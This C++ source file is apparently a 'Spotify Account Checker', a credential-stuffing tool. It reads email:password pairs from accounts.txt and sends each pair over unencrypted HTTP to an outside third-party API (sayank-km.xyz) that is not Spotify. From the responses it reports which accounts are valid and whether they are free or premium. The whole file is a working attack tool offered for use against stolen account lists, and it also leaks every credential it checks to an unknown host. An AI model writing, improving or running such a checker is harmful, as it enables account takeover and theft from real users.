#include <iostream>
#include <string>
#include <fstream>

#define CURL_STATICLIB

#include "../spotify_checker/curl/curl.h"

#ifdef _DEBUG
#   pragma comment (lib, "curl/libcurl_a_debug.lib")
#else 
#   pragma comment (lib, "curl/libcurl_a.lib")
#endif

struct MemoryStruct {
	char *memory;
	size_t size;
};
static size_t
WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
	size_t realsize = size * nmemb;
	struct MemoryStruct *mem = (struct MemoryStruct *)userp;

	mem->memory = static_cast<char*>(realloc(mem->memory, mem->size + realsize + 1));
	if (mem->memory == NULL) {
		printf("not enough memory (realloc returned NULL)\n");
		return 0;
	}

	memcpy(&(mem->memory[mem->size]), contents, realsize);
	mem->size += realsize;
	mem->memory[mem->size] = 0;

	return realsize;
}

struct MemoryStruct chunk;

auto getData(std::string username, std::string password)
{
	curl_global_init(CURL_GLOBAL_DEFAULT);
	CURL *curl = curl_easy_init();
	CURLcode res;
	std::string to_return;

	chunk.memory = static_cast<char*>(malloc(1));
	chunk.size = 0;

	const std::string postData = "email=" + username + "&pass=" + password;
	if (curl)
	{
		curl_easy_setopt(curl, CURLOPT_URL, "http://sayank-km.xyz/api/?" + postData); // https://github.com/thaniaanatasya/spotify
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, static_cast<void*>(&chunk));
		res = curl_easy_perform(curl);
		if (res != CURLE_OK)
			fprintf(stderr,	"curl_easy_perform() failed: %s\n",
				curl_easy_strerror(res));

		to_return = chunk.memory;
		curl_easy_cleanup(curl);
	}
	curl_global_cleanup();
	return to_return;
}

auto main(void) -> int
{

	SetConsoleTitle("Spotify Account Checker by janekaldo");

	std::string line;
	std::ifstream file("accounts.txt");
	std::string user, pw;

	while (getline(file, line)) {
		int pos = line.find_first_of(':');
		user = line.substr(0, pos);
		pw = line.substr(pos + 1);

		if (user.length() > 1 && pw.length() > 4) // I'm unsure if these are the right values
		{
			auto returnData = getData(user, pw);
			if (returnData.find("errorInvalidCredentials") != std::string::npos)
				printf("%s:%s - Invalid account credentials\n", user.c_str(), pw.c_str());
			else
			{
				if (returnData.find("Spotify Free") != std::string::npos)
					printf("%s:%s - Valid account! Subscription type: FREE\n", user.c_str(), pw.c_str());
				else
					printf("%s:%s - Valid account! Subscription type: PREMIUM\n", user.c_str(), pw.c_str());
			}
		}
		else
		{
			printf("\n Invalid entries \n");
			printf("Press any key to check another account.\n");
		}
	}
	system("pause");
	return 1;
}
